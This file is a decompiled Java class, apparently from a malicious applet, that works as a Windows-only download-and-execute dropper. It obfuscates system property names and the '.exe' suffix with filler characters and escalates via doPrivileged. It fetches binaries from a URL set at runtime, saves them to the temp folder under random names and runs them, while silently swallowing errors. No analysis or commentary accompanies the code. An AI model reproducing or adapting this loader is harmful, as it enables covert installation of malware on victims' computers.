// 
// Decompiled by Procyon v0.5.30
// 

package sunny;

import java.security.AccessController;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.net.URL;
import java.security.PrivilegedExceptionAction;

public class MyBuilds implements PrivilegedExceptionAction
{
    public static String data;
    public static String cc;
    
    public static byte[] StringToBytes(final String s) {
        final int n = 2;
        final byte[] array = new byte[s.length() / n];
        final int n2 = 16;
        for (int i = 0; i < s.length(); i += n) {
            array[i / n] = (byte)((Character.digit(s.charAt(i), n2) << 4) + Character.digit(s.charAt(i + 1), n2));
        }
        return array;
    }
    
    @Override
    public Object run() throws Exception {
        if (MyBuilds.data == null) {
            return null;
        }
        try {
            if (System.getProperty("vvosvvv.vnavvvvme".replace("v", "")).indexOf("UUWUUUUUUinUdowUUUs".replace("U", "")) == -1) {
                return null;
            }
            int int1 = 1;
            if (MyBuilds.cc != null) {
                int1 = Integer.parseInt(MyBuilds.cc);
            }
            for (int i = 0; i < int1; ++i) {
                final URL url = new URL(MyBuilds.data + Integer.toString(i));
                url.openConnection();
                final InputStream openStream = url.openStream();
                final String string = System.getProperty("jcccava.io.tcccmcpccccdciccr".replace("c", "")) + File.separator + Math.random() + ".ex555555e".replace("5", "");
                final FileOutputStream fileOutputStream = new FileOutputStream(string);
                int n = 0;
                int read;
                while ((read = openStream.read()) != -1) {
                    fileOutputStream.write(read);
                    ++n;
                }
                openStream.close();
                fileOutputStream.close();
                this.Caller(n, string);
            }
        }
        catch (Exception ex) {}
        return null;
    }
    
    private void Caller(final int n, final String s) throws Exception {
        final Runtime runtime = Runtime.getRuntime();
        Boolean b = false;
        if (n >= 1024) {
            b = true;
        }
        if (b) {
            this.ef(runtime, s);
        }
    }
    
    private Process ef(final Runtime runtime, final String s) throws Exception {
        return runtime.exec(s, null, null);
    }
    
    public MyBuilds() {
        try {
            AccessController.doPrivileged((PrivilegedExceptionAction<Object>)this);
        }
        catch (Exception ex) {}
    }
    
    static {
        MyBuilds.data = null;
        MyBuilds.cc = null;
    }
}
